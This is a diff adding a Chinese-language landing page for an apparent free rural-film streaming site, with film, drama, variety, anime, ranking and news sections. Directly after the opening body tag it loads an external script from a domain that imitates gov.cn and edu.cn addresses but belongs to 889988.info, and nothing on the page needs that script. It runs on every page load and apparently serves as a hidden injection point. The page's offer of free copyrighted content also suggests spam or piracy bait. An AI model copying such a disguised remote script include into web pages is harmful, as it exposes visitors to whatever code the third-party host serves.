@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>乡村电影网 - 乡土情怀免费在线观看，乡村电影/农村剧/田园综艺/纪实</title>
+<meta name="keywords" content="乡村电影网,xiangcundianyingwang,乡村电影,农村剧,乡土影视,田园综艺">
+<meta name="description" content="乡村电影网(xiangcundianyingwang-wap)聚焦乡土情怀影视作品免费在线观看，乡村电影、农村剧、田园综艺与田园纪实全品类覆盖，感受质朴动人的乡村故事。">
+<meta name="renderer" content="webkit">
+<meta name="author" content="乡村电影网">
+<link rel="canonical" href="https://xiangcundianyingwang-wap.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+  --wheat:#e8b33a;--wheat2:#f2ce6b;--straw:#c08a1f;--earth:#3d2b17;--leaf:#4f7a2f;--leaf2:#7ba84c;
+  --cream:#fbf6e9;--paper:#fffdf6;--ink:#2b2114;--ink2:#6b5d45;--line:#e8ddc2;
+}
+html{scroll-behavior:smooth;scroll-padding-top:82px}
+body{font-family:"Noto Sans SC","PingFang SC","Microsoft YaHei",-apple-system,sans-serif;background:var(--cream);color:var(--ink);line-height:1.8;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+ul{list-style:none}a{color:inherit;text-decoration:none}
+.wrap{width:100%;max-width:1160px;margin:0 auto;padding:0 24px}
+::selection{background:var(--wheat);color:var(--earth)}
+
+/* 顶部 */
+.head{position:sticky;top:0;z-index:1000;background:rgba(251,246,233,.94);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.head-in{display:flex;align-items:center;justify-content:space-between;height:82px;gap:16px}
+.logo{display:flex;align-items:center;gap:14px}
+.logo .mk{width:48px;height:48px;border-radius:14px;background:linear-gradient(140deg,var(--wheat),var(--straw));display:flex;align-items:center;justify-content:center;font-size:22px;box-shadow:0 6px 16px rgba(192,138,31,.32)}
+.logo b{font-size:16.5px;font-weight:900;color:var(--earth);letter-spacing:-.3px}
+.logo b i{font-style:normal;color:var(--straw)}
+.logo small{display:block;font-size:8px;letter-spacing:2.5px;color:var(--ink2);text-transform:uppercase;font-weight:700}
+.menu{display:flex;gap:4px}
+.menu a{font-size:13.5px;padding:9px 15px;color:var(--ink2);font-weight:700;border-radius:10px;transition:.25s}
+.menu a:hover,.menu a.on{color:var(--earth);background:rgba(232,179,58,.22)}
+.tools{display:flex;gap:10px}
+.tools button{width:40px;height:40px;border:1px solid var(--line);border-radius:11px;background:transparent;color:var(--earth);font-size:15px;cursor:pointer;transition:.25s}
+.tools button:hover{background:var(--earth);color:var(--wheat);border-color:var(--earth)}
+.m-btn{display:none}
+
+/* Hero：田野地平线 */
+.hero{position:relative;overflow:hidden;border-bottom:1px solid var(--line)}
+.hero-sky{position:absolute;inset:0;background:linear-gradient(180deg,#fbe9b9 0%,#f6d98a 42%,#eccb6f 60%,transparent 60%);z-index:0}
+.hero-field{position:absolute;left:0;right:0;bottom:0;height:46%;background:linear-gradient(180deg,var(--leaf2),var(--leaf));z-index:0}
+.hero-field:before{content:'';position:absolute;inset:0;background:repeating-linear-gradient(90deg,transparent,transparent 34px,rgba(0,0,0,.07) 34px,rgba(0,0,0,.07) 36px),repeating-linear-gradient(0deg,transparent,transparent 34px,rgba(0,0,0,.07) 34px,rgba(0,0,0,.07) 36px);opacity:.5}
+.hero-field:after{content:'';position:absolute;left:0;right:0;top:0;height:3px;background:var(--wheat)}
+.hero-sun{position:absolute;right:8%;top:12%;width:150px;height:150px;border-radius:50%;background:radial-gradient(circle,rgba(255,250,220,.95),rgba(255,236,170,.5) 55%,transparent 72%);z-index:0;animation:sun 6s ease-in-out infinite}
+@keyframes sun{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.06);opacity:.88}}
+.hero-in{position:relative;z-index:1;padding:88px 0 0;display:grid;grid-template-columns:1.35fr 1fr;gap:52px;align-items:end}
+.hero h1{font-size:clamp(38px,6.6vw,64px);font-weight:900;line-height:1.2;color:var(--earth);letter-spacing:-1.5px}
+.hero h1 em{font-style:normal;color:var(--straw)}
+.hero h1 .hand{font-size:.72em;display:inline-block;transform:translateY(6px)}
+.hero .lead{font-size:15px;color:#5c4a2c;margin:22px 0 30px;max-width:440px;line-height:2.1;font-weight:500}
+.hero .row{display:flex;gap:14px;flex-wrap:wrap;padding-bottom:56px}
+.btn{padding:15px 38px;border:0;border-radius:14px;font-size:13.5px;font-weight:800;cursor:pointer;transition:.3s;letter-spacing:1.5px;color:#fff;background:var(--straw)}
+.btn:hover{transform:translateY(-3px);background:var(--earth);box-shadow:0 14px 28px rgba(61,43,23,.26)}
+.btn.ghost{background:transparent;color:var(--earth);border:1.5px solid var(--earth)}
+.btn.ghost:hover{background:var(--earth);color:var(--wheat)}
+.hero-side{background:var(--paper);border:1px solid var(--line);border-radius:20px 20px 0 0;border-bottom:0;padding:24px;box-shadow:0 -10px 30px rgba(61,43,23,.08)}
+.hero-side .hd{font-size:9.5px;font-weight:800;letter-spacing:3px;color:var(--straw);text-transform:uppercase;margin-bottom:16px;display:flex;justify-content:space-between}
+.hero-side .hd span:last-child{color:var(--leaf);letter-spacing:2px}
+.hero-side .it{display:flex;gap:13px;align-items:center;padding:12px 0;border-bottom:1px dashed var(--line);font-size:13.5px;font-weight:600}
+.hero-side .it:last-child{border-bottom:0}
+.hero-side .it b{font-size:10px;font-weight:800;color:var(--earth);background:rgba(232,179,58,.4);width:24px;height:24px;border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.hero-side .it i{font-style:normal;margin-left:auto;color:var(--straw);font-weight:800;font-size:12px}
+
+/* 数据条 */
+.mstat{position:relative;z-index:2;display:grid;grid-template-columns:repeat(4,1fr);background:var(--earth);color:var(--wheat2)}
+.mstat .s{padding:26px 18px;text-align:center;border-right:1px solid rgba(255,255,255,.12)}
+.mstat .s:last-child{border-right:0}
+.mstat .s b{display:block;font-size:30px;font-weight:900;letter-spacing:-1px}
+.mstat .s span{font-size:10px;color:var(--wheat);letter-spacing:3px;text-transform:uppercase;font-weight:700}
+
+.sec{padding:96px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:30px;margin-bottom:48px;flex-wrap:wrap}
+.sec-head .l .kick{font-size:9.5px;letter-spacing:4px;color:var(--straw);font-weight:800;text-transform:uppercase;margin-bottom:10px}
+.sec-head .l h2{font-size:30px;font-weight:900;letter-spacing:-1px;color:var(--earth)}
+.sec-head .l h2 em{font-style:normal;color:var(--leaf);font-weight:900}
+.sec-head .r{font-size:13px;color:var(--ink2);max-width:320px;text-align:right}
+
+/* 电影：田野色带竖版卡 */
+.mvs{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px}
+.mv{border-radius:18px;overflow:hidden;background:var(--paper);border:1px solid var(--line);transition:.4s;cursor:pointer;position:relative}
+.mv:before{content:'';position:absolute;left:0;right:0;top:0;height:5px;background:var(--wheat);z-index:3}
+.mv:hover{transform:translateY(-9px) rotate(-.5deg);box-shadow:0 20px 36px rgba(61,43,23,.16);border-color:var(--wheat)}
+.mv-cap{height:170px;position:relative}
+.mv-cap .yr{position:absolute;top:14px;left:14px;font-size:9px;font-weight:800;color:var(--earth);background:var(--wheat);padding:5px 11px;border-radius:8px;z-index:2;letter-spacing:1px}
+.mv-cap .sc{position:absolute;bottom:12px;right:12px;font-size:12px;font-weight:800;color:#fff;background:var(--straw);padding:5px 12px;border-radius:100px;z-index:2}
+.mv-body{padding:16px 18px 18px}
+.mv-body h3{font-size:15.5px;font-weight:900;color:var(--earth);line-height:1.5}
+.mv-body p{font-size:11.5px;color:var(--ink2);margin-top:7px;line-height:1.85}
+
+/* 剧集：木质折叠行 */
+.tvs{display:flex;flex-direction:column;gap:12px}
+.tv{border-radius:16px;background:var(--paper);border:1px solid var(--line);padding:18px 20px;display:grid;grid-template-columns:64px 1fr auto;gap:18px;align-items:center;transition:.35s;cursor:pointer}
+.tv:hover{border-color:var(--straw);background:linear-gradient(90deg,rgba(232,179,58,.14),var(--paper));transform:translateX(8px)}
+.tv .no{width:56px;height:56px;border-radius:13px;background:var(--earth);color:var(--wheat2);display:flex;flex-direction:column;align-items:center;justify-content:center;line-height:1}
+.tv .no b{font-size:20px;font-weight:900}
+.tv .no small{font-size:7px;letter-spacing:1.5px;font-weight:700;margin-top:2px}
+.tv h4{font-size:16px;font-weight:900;color:var(--earth);letter-spacing:-.2px}
+.tv h4 small{display:block;font-size:11.5px;color:var(--ink2);font-weight:500;margin-top:5px}
+.tv .chips{display:flex;gap:7px;flex-wrap:wrap;justify-content:flex-end}
+.tv .chips i{font-style:normal;font-size:9.5px;font-weight:700;color:var(--leaf);border:1px solid rgba(79,122,47,.35);padding:5px 11px;border-radius:100px;background:rgba(123,168,76,.1)}
+
+/* 综艺：稻草堆叠卡 */
+.vrs{display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));gap:22px}
+.vr{border-radius:20px;overflow:hidden;background:var(--paper);border:1px solid var(--line);transition:.4s;cursor:pointer;position:relative}
+.vr:hover{transform:translateY(-10px);box-shadow:0 22px 42px rgba(61,43,23,.18)}
+.vr:hover .ar{transform:rotate(-8deg) scale(1.1)}
+.vr-cap{height:150px;position:relative;overflow:hidden}
+.vr-cap .ar{position:absolute;right:-10px;bottom:-12px;font-size:88px;opacity:.95;transition:.5s;z-index:1}
+.vr-cap .no{position:absolute;top:16px;left:16px;font-size:8px;font-weight:800;letter-spacing:2px;color:var(--paper);background:var(--earth);padding:6px 12px;border-radius:8px;z-index:2}
+.vr-body{padding:20px}
+.vr-body .k{font-size:8.5px;color:var(--straw);letter-spacing:3px;font-weight:800;text-transform:uppercase}
+.vr-body h3{font-size:17px;font-weight:900;color:var(--earth);margin:9px 0 10px}
+.vr-body p{font-size:12px;color:var(--ink2);line-height:1.95}
+
+/* 动漫：田园星期板 */
+.ans{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:16px}
+.an{border-radius:18px;overflow:hidden;background:var(--paper);border:1px solid var(--line);transition:.4s;cursor:pointer;text-align:center}
+.an:hover{transform:translateY(-8px);box-shadow:0 18px 34px rgba(61,43,23,.16);border-color:var(--leaf)}
+.an .hd{background:var(--leaf);color:var(--paper);padding:10px;font-size:13px;font-weight:900;letter-spacing:1px;display:flex;justify-content:space-between;align-items:center}
+.an .hd small{font-size:8.5px;font-weight:700;letter-spacing:1.5px;opacity:.85}
+.an .bd{padding:20px 16px}
+.an .bd .em{font-size:38px;display:block;margin-bottom:8px}
+.an .bd h4{font-size:13.5px;font-weight:900;color:var(--earth);min-height:38px;line-height:1.5}
+.an .bd .pg{height:6px;border-radius:100px;background:var(--line);overflow:hidden;margin:12px 0 8px}
+.an .bd .pg b{display:block;height:100%;border-radius:100px;background:linear-gradient(90deg,var(--leaf2),var(--wheat))}
+.an .bd span{font-size:10.5px;color:var(--ink2);font-weight:600}
+
+/* 排行榜：大地双榜 */
+.rk{display:grid;grid-template-columns:1fr 1fr;gap:26px}
+.rk-col{background:var(--earth);border-radius:22px;padding:26px}
+.rk-h{display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,.16);padding-bottom:16px;margin-bottom:8px}
+.rk-h h3{font-size:18px;font-weight:900;color:var(--wheat2);letter-spacing:-.3px}
+.rk-h span{font-size:8.5px;color:var(--earth);background:var(--wheat);padding:6px 12px;border-radius:100px;letter-spacing:1.5px;font-weight:800;text-transform:uppercase}
+.rk-i{display:grid;grid-template-columns:36px 40px 1fr 46px;gap:14px;align-items:center;padding:13px 6px;border-bottom:1px solid rgba(255,255,255,.12)}
+.rk-i:last-child{border-bottom:0}
+.rk-i .no{font-size:19px;font-weight:900;color:rgba(255,255,255,.42);text-align:center}
+.rk-i.g1 .no,.rk-i.g2 .no,.rk-i.g3 .no{color:var(--wheat)}
+.rk-i .th{width:40px;height:40px;border-radius:11px;display:flex;align-items:center;justify-content:center;font-size:17px}
+.rk-i h4{font-size:13px;font-weight:800;color:var(--paper)}
+.rk-i h4 small{display:block;font-size:9.5px;color:var(--wheat2);font-weight:500;margin-top:2px}
+.rk-i .rt{font-size:13px;font-weight:800;color:var(--wheat2);text-align:right}
+
+/* 资讯：卷轴式 */
+.nws{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:22px}
+.nw{border-radius:18px;overflow:hidden;background:var(--paper);border:1px solid var(--line);transition:.4s;cursor:pointer;position:relative}
+.nw:before{content:'';position:absolute;left:14px;top:14px;bottom:14px;width:3px;border-radius:100px;background:var(--wheat)}
+.nw:hover{transform:translateY(-8px);box-shadow:0 18px 34px rgba(61,43,23,.14);border-color:var(--straw)}
+.nw-cap{height:110px;position:relative;display:flex;align-items:flex-start;justify-content:space-between;padding:18px 18px 18px 26px}
+.nw-cap .no{font-size:26px;font-weight:900;color:rgba(255,255,255,.96)}
+.nw-cap .dt{font-size:8.5px;font-weight:800;color:var(--earth);background:var(--wheat);padding:6px 11px;border-radius:8px;z-index:2}
+.nw-body{padding:4px 22px 22px 26px}
+.nw-body .tg{font-size:8.5px;font-weight:800;color:var(--leaf);border:1px solid rgba(79,122,47,.35);padding:4px 11px;border-radius:100px;letter-spacing:1.5px;text-transform:uppercase;background:rgba(123,168,76,.1)}
+.nw-body h3{font-size:14.5px;font-weight:900;color:var(--earth);margin:12px 0 8px;line-height:1.65}
+.nw-body p{font-size:11.5px;color:var(--ink2);line-height:1.9}
+
+/* 关于 */
+.about{border-top:1px solid var(--line);background:var(--earth);color:var(--wheat2);padding:80px 0 0}
+.about-in{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:44px}
+.about .logo .mk{background:linear-gradient(140deg,var(--wheat),var(--straw))}
+.about .logo b{color:var(--wheat2)}
+.about .logo small{color:var(--wheat)}
+.about-brand p{font-size:13px;color:#cdb98c;line-height:2.1;max-width:340px;margin-top:18px}
+.about-col h4{font-size:9px;color:var(--wheat);letter-spacing:4px;font-weight:800;text-transform:uppercase;margin-bottom:22px}
+.about-col a{display:block;font-size:13px;color:#d8c595;padding:7px 0;transition:.2s}
+.about-col a:hover{color:var(--wheat2);padding-left:8px}
+.copy{border-top:1px solid rgba(255,255,255,.14);margin-top:50px;padding:28px 0;font-size:11.5px;color:#a89468;text-align:center;line-height:2}
+.copy a{color:#d8c595}
+.copy a:hover{color:var(--wheat)}
+
+#bar{position:fixed;top:0;left:0;height:3px;z-index:9999;width:0;background:var(--straw)}
+.top{position:fixed;right:18px;bottom:28px;width:48px;height:48px;border-radius:50%;background:var(--straw);color:#fff;border:0;font-size:18px;cursor:pointer;z-index:999;opacity:0;visibility:hidden;transition:.3s;box-shadow:0 8px 20px rgba(192,138,31,.35)}
+.top.show{opacity:1;visibility:visible}
+.top:hover{transform:translateY(-4px) scale(1.08)}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div id="bar"></div>
+
+<header class="head">
+  <div class="wrap head-in">
+    <a href="#home" class="logo">
+      <div class="mk">🌾</div><b><i>乡村</i>电影网</b><small>COUNTRY CINEMA</small>
+    </a>
+    <nav class="menu" id="menu">
+      <a href="#home" class="on">首页</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">剧集</a>
+      <a href="#variety">综艺</a>
+      <a href="#anime">动漫</a>
+      <a href="#rank">排行榜</a>
+      <a href="#news">资讯</a>
+      <a href="#about">关于</a>
+    </nav>
+    <div class="tools">
+      <button onclick="alert('搜索功能演示')" aria-label="搜索">🔍</button>
+      <button class="m-btn" onclick="document.getElementById('menu').classList.toggle('open')" aria-label="菜单">☰</button>
+    </div>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="hero-sky"></div>
+  <div class="hero-field"></div>
+  <div class="hero-sun"></div>
+  <div class="wrap hero-in">
+    <div>
+      <h1>回到<em>田野</em>的<em>光影</em><span class="hand">🌾</span></h1>
+      <p class="lead">乡村电影网(xiangcundianyingwang-wap)聚焦乡土情怀影视作品免费在线观看，乡村电影、农村剧、田园综艺与田园纪实全品类覆盖，感受质朴动人的乡村故事。</p>
+      <div class="row">
+        <button class="btn" onclick="location.href='#movie'">走进田园影院</button>
+        <button class="btn ghost" onclick="location.href='#rank'">查看热度榜 →</button>
+      </div>
+    </div>
+    <aside class="hero-side">
+      <div class="hd"><span>乡土经典</span><span>必看</span></div>
+      <div class="it"><b>1</b><span>人生</span><i>9.2</i></div>
+      <div class="it"><b>2</b><span>老井</span><i>8.9</i></div>
+      <div class="it"><b>3</b><span>秋菊打官司</span><i>9.0</i></div>
+      <div class="it"><b>4</b><span>那山那人那狗</span><i>9.1</i></div>
+      <div class="it"><b>5</b><span>隐入尘烟</span><i>8.8</i></div>
+    </aside>
+  </div>
+  <div class="wrap"><div class="mstat">
+    <div class="s"><b>5,000+</b><span>乡土片源</span></div>
+    <div class="s"><b>8K</b><span>画质</span></div>
+    <div class="s"><b>每日</b><span>更新</span></div>
+    <div class="s"><b>0 元</b><span>免费</span></div>
+  </div></div>
+</section>
+
+<!-- 电影：田野色带竖版卡 -->
+<section class="sec" id="movie">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="l"><div class="kick">COUNTRY FILMS</div><h2>乡土<em>电影</em></h2></div>
+      <div class="r">顶部稻穗金色色带 + 左侧圆角年份徽标，竖版封面卡片网格。</div>
+    </div>
+    <div class="mvs">
+      <article class="mv"><div class="mv-cap" style="background:linear-gradient(160deg,#c08a1f,#e8b33a)"><span class="yr">1991</span><span class="sc">★ 9.2</span></div><div class="mv-body"><h3>人生</h3><p>陕北高原上，知识青年高加林在城乡之间挣扎抉择。</p></div></article>
+      <article class="mv"><div class="mv-cap" style="background:linear-gradient(160deg,#4f7a2f,#7ba84c)"><span class="yr">1987</span><span class="sc">★ 8.9</span></div><div class="mv-body"><h3>老井</h3><p>太行山村几代人打井求水的执着与坚守。</p></div></article>
+      <article class="mv"><div class="mv-cap" style="background:linear-gradient(160deg,#3d2b17,#6b4a25)"><span class="yr">1992</span><span class="sc">★ 9.0</span></div><div class="mv-body"><h3>秋菊打官司</h3><p>农村妇女秋菊为了"讨个说法"一路上告。</p></div></article>
+      <article class="mv"><div class="mv-cap" style="background:linear-gradient(160deg,#7ba84c,#cfe09a)"><span class="yr">1999</span><span class="sc">★ 9.1</span></div><div class="mv-body"><h3>那山那人那狗</h3><p>乡邮员父子翻山越岭送信，一路体悟亲情与乡土。</p></div></article>
+      <article class="mv"><div class="mv-cap" style="background:linear-gradient(160deg,#c08a1f,#8a5a17)"><span class="yr">2022</span><span class="sc">★ 8.8</span></div><div class="mv-body"><h3>隐入尘烟</h3><p>西北荒漠里，两个被遗忘的人相互取暖。</p></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 剧集：木质折叠行 -->
+<section class="sec" id="tv">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="l"><div class="kick">RURAL DRAMA</div><h2>乡村<em>剧集</em></h2></div>
+      <div class="r">左侧木质色编号方块 + 中间片名简介 + 右侧绿色分类胶囊。</div>
+    </div>
+    <div class="tvs">
+      <article class="tv"><div class="no"><b>01</b><small>EPISODE</small></div><div><h4>山海情<small>当代 · 中国大陆 · 23集</small></h4></div><div class="chips"><i>扶贫</i><i>年代</i><i>豆瓣9.2</i></div></article>
+      <article class="tv"><div class="no"><b>02</b><small>EPISODE</small></div><div><h4>乡村爱情<small>喜剧 · 中国大陆 · 多季</small></h4></div><div class="chips"><i>乡村</i><i>喜剧</i><i>经典</i></div></article>
+      <article class="tv"><div class="no"><b>03</b><small>EPISODE</small></div><div><h4>平凡的世界<small>年代 · 中国大陆 · 56集</small></h4></div><div class="chips"><i>年代</i><i>励志</i><i>豆瓣9.0</i></div></article>
+      <article class="tv"><div class="no"><b>04</b><small>EPISODE</small></div><div><h4>县委大院<small>现实 · 中国大陆 · 24集</small></h4></div><div class="chips"><i>现实</i><i>主旋律</i><i>豆瓣8.5</i></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 综艺：稻草堆叠卡 -->
+<section class="sec" id="variety">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="l"><div class="kick">COUNTRY VARIETY</div><h2>田园<em>综艺</em></h2></div>
+      <div class="r">右下角大幅稻草堆 emoji 装饰 + 左上黑色编号徽标，hover 稻草倾斜。</div>
+    </div>
+    <div class="vrs">
+      <article class="vr"><div class="vr-cap" style="background:linear-gradient(135deg,#c08a1f,#e8b33a)"><span class="ar">🛖</span><span class="no">田园生活</span></div><div class="vr-body"><div class="k">SLOW LIFE</div><h3>向往的生活</h3><p>蘑菇屋里的慢节奏日常，种菜做饭会友，返璞归真。</p></div></article>
+      <article class="vr"><div class="vr-cap" style="background:linear-gradient(135deg,#4f7a2f,#7ba84c)"><span class="ar">🌻</span><span class="no">农耕纪实</span></div><div class="vr-body"><div class="k">FARMING</div><h3>种地吧</h3><p>十位年轻人扎根农田，从播种到收获记录真实农耕。</p></div></article>
+      <article class="vr"><div class="vr-cap" style="background:linear-gradient(135deg,#7ba84c,#cfe09a)"><span class="ar">🪵</span><span class="no">乡建改造</span></div><div class="vr-body"><div class="k">COUNTRY LIFE</div><h3>亲爱的客栈</h3><p>在山水之间经营客栈，体验乡村民宿的诗与远方。</p></div></article>
+      <article class="vr"><div class="vr-cap" style="background:linear-gradient(135deg,#3d2b17,#8a5a17)"><span class="ar">🌾</span><span class="no">丰收体验</span></div><div class="vr-body"><div class="k">HARVEST</div><h3>丰收中国</h3><p>走进田间地头，感受各地丰收时节的喜悦与风物。</p></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 动漫：田园星期板 -->
+<section class="sec" id="anime">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="l"><div class="kick">ANIME SCHEDULE</div><h2>田园<em>动漫</em></h2></div>
+      <div class="r">绿色表头星期板，emoji 主题图标 + 渐变进度条显示更新进度。</div>
+    </div>
+    <div class="ans">
+      <article class="an"><div class="hd"><span>周一</span><small>MON</small></div><div class="bd"><span class="em">🐓</span><h4>一拳超人</h4><div class="pg"><b style="width:88%"></b></div><span>22/24 更新中</span></div></article>
+      <article class="an"><div class="hd"><span>周二</span><small>TUE</small></div><div class="bd"><span class="em">🐄</span><h4>葬送的芙莉莲</h4><div class="pg"><b style="width:78%"></b></div><span>20/28 更新中</span></div></article>
+      <article class="an"><div class="hd"><span>周三</span><small>WED</small></div><div class="bd"><span class="em">🐑</span><h4>牧场物语</h4><div class="pg"><b style="width:92%"></b></div><span>26/28 更新中</span></div></article>
+      <article class="an"><div class="hd"><span>周四</span><small>THU</small></div><div class="bd"><span class="em">🦋</span><h4>虫师</h4><div class="pg"><b style="width:100%"></b></div><span>26/26 已完结</span></div></article>
+      <article class="an"><div class="hd"><span>周五</span><small>FRI</small></div><div class="bd"><span class="em">🍄</span><h4>夏目友人帐</h4><div class="pg"><b style="width:70%"></b></div><span>52/72 更新中</span></div></article>
+      <article class="an"><div class="hd"><span>周六</span><small>SAT</small></div><div class="bd"><span class="em">🌿</span><h4>来自风平浪静的明天</h4><div class="pg"><b style="width:100%"></b></div><span>26/26 已完结</span></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 排行榜：大地双榜 -->
+<section class="sec" id="rank">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="l"><div class="kick">TOP HARVEST</div><h2>田园<em>排行榜</em></h2></div>
+      <div class="r">大地色深棕底双榜（电影榜 / 剧集榜），序号前三稻穗金高亮。</div>
+    </div>
+    <div class="rk">
+      <div class="rk-col"><div class="rk-h"><h3>🎬 乡土电影榜</h3><span>电影</span></div>
+        <div class="rk-i g1"><div class="no">1</div><div class="th" style="background:linear-gradient(135deg,#c08a1f,#e8b33a)">🎬</div><h4>人生<small>1991 · 吴天明</small></h4><div class="rt">9.2</div></div>
+        <div class="rk-i g2"><div class="no">2</div><div class="th" style="background:linear-gradient(135deg,#4f7a2f,#7ba84c)">🍂</div><h4>那山那人那狗<small>1999 · 霍建起</small></h4><div class="rt">9.1</div></div>
+        <div class="rk-i g3"><div class="no">3</div><div class="th" style="background:linear-gradient(135deg,#3d2b17,#6b4a25)">🌾</div><h4>秋菊打官司<small>1992 · 张艺谋</small></h4><div class="rt">9.0</div></div>
+        <div class="rk-i"><div class="no">4</div><div class="th" style="background:linear-gradient(135deg,#7ba84c,#cfe09a)">🌻</div><h4>隐入尘烟<small>2022 · 李睿珺</small></h4><div class="rt">8.8</div></div>
+        <div class="rk-i"><div class="no">5</div><div class="th" style="background:linear-gradient(135deg,#8a5a17,#c08a1f)">🪵</div><h4>老井<small>1987 · 吴天明</small></h4><div class="rt">8.9</div></div>
+      </div>
+      <div class="rk-col"><div class="rk-h"><h3>📺 乡村剧集榜</h3><span>剧集</span></div>
+        <div class="rk-i g1"><div class="no">1</div><div class="th" style="background:linear-gradient(135deg,#c08a1f,#e8b33a)">🏡</div><h4>山海情<small>2021 · 孔笙 / 孙墨龙</small></h4><div class="rt">9.2</div></div>
+        <div class="rk-i g2"><div class="no">2</div><div class="th" style="background:linear-gradient(135deg,#4f7a2f,#7ba84c)">🌾</div><h4>平凡的世界<small>2015 · 毛卫宁</small></h4><div class="rt">9.0</div></div>
+        <div class="rk-i g3"><div class="no">3</div><div class="th" style="background:linear-gradient(135deg,#3d2b17,#6b4a25)">👨‍🌾</div><h4>乡村爱情<small>2006 · 赵本山</small></h4><div class="rt">8.6</div></div>
+        <div class="rk-i"><div class="no">4</div><div class="th" style="background:linear-gradient(135deg,#7ba84c,#cfe09a)">🏘️</div><h4>县委大院<small>2022 · 孔笙</small></h4><div class="rt">8.5</div></div>
+        <div class="rk-i"><div class="no">5</div><div class="th" style="background:linear-gradient(135deg,#8a5a17,#c08a1f)">🌿</div><h4>大宅门<small>2001 · 郭宝昌</small></h4><div class="rt">9.3</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 资讯：卷轴式 -->
+<section class="sec" id="news">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="l"><div class="kick">FOLK NEWS</div><h2>田园<em>资讯</em></h2></div>
+      <div class="r">左侧稻穗金竖条 + 彩色封面角标 + 绿色分类胶囊 + 标题摘要。</div>
+    </div>
+    <div class="nws">
+      <article class="nw"><div class="nw-cap" style="background:linear-gradient(135deg,#c08a1f,#e8b33a)"><span class="no">01</span><span class="dt">10月06日</span></div><div class="nw-body"><span class="tg">乡土</span><h3>多部乡土题材影片集中展映，聚焦乡村真实生活</h3><p>以乡村振兴为背景的现实题材作品陆续上线。</p></div></article>
+      <article class="nw"><div class="nw-cap" style="background:linear-gradient(135deg,#4f7a2f,#7ba84c)"><span class="no">02</span><span class="dt">10月04日</span></div><div class="nw-body"><span class="tg">纪录</span><h3>田园纪实系列上新，记录四季农耕与风物</h3><p>镜头深入田间，呈现真实的农事与丰收场景。</p></div></article>
+      <article class="nw"><div class="nw-cap" style="background:linear-gradient(135deg,#3d2b17,#6b4a25)"><span class="no">03</span><span class="dt">09月30日</span></div><div class="nw-body"><span class="tg">行业</span><h3>乡村题材创作扶持加码，鼓励新人导演扎根乡土</h3><p>多项扶持计划启动，助力乡村故事走向银幕。</p></div></article>
+      <article class="nw"><div class="nw-cap" style="background:linear-gradient(135deg,#7ba84c,#cfe09a)"><span class="no">04</span><span class="dt">09月27日</span></div><div class="nw-body"><span class="tg">综艺</span><h3>田园慢综艺回归，乡村民宿与农耕体验成新热点</h3><p>慢节奏生活方式持续受到观众喜爱。</p></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="about" id="about">
+  <div class="wrap">
+    <div class="about-in">
+      <div class="about-brand">
+        <div class="logo"><div class="mk">🌾</div><b>乡村电影网</b><small>COUNTRY CINEMA</small></div>
+        <p>乡村电影网(xiangcundianyingwang-wap)聚焦乡土情怀影视作品免费在线观看，电影、农村剧、田园综艺与田园纪实全品类覆盖，感受质朴动人的乡村故事。</p>
+      </div>
+      <div class="about-col"><h4>片库导航</h4><a href="#home">首页</a><a href="#movie">电影</a><a href="#tv">剧集</a><a href="#variety">综艺</a><a href="#anime">动漫</a></div>
+      <div class="about-col"><h4>人气榜单</h4><a href="#rank">乡土电影榜</a><a href="#rank">乡村剧集榜</a><a href="#rank">田园综艺</a><a href="#rank">田园动漫</a></div>
+      <div class="about-col"><h4>关于本站</h4><a href="#about">网站简介</a><a href="#about">用户协议</a><a href="#about">免责声明</a><a href="#about">联系方式</a></div>
+    </div>
+    <div class="copy">
+      <p>© 2026 乡村电影网(xiangcundianyingwang-wap) · <a href="https://xiangcundianyingwang-wap.github.io/">https://xiangcundianyingwang-wap.github.io/</a></p>
+      <p>本站仅供影视资讯与在线观看服务，内容版权归原作者及发行方所有。</p>
+    </div>
+  </div>
+</section>
+
+<button class="top" id="top" onclick="window.scrollTo({top:0,behavior:'smooth'})" aria-label="回到顶部">↑</button>
+
+<script>
+window.addEventListener('scroll',function(){
+  var st=document.documentElement.scrollTop||document.body.scrollTop;
+  var h=document.documentElement.scrollHeight-document.documentElement.clientHeight;
+  document.getElementById('bar').style.width=(st/h*100)+'%';
+  document.getElementById('top').classList.toggle('show',st>400);
+  var cur='';
+  document.querySelectorAll('section[id]').forEach(function(s){if(s.getBoundingClientRect().top<=150)cur=s.id});
+  document.querySelectorAll('.menu a').forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur)});
+  if(window.innerWidth<=900)document.getElementById('menu').classList.remove('open');
+});
+</script>
+</body>
+</html>
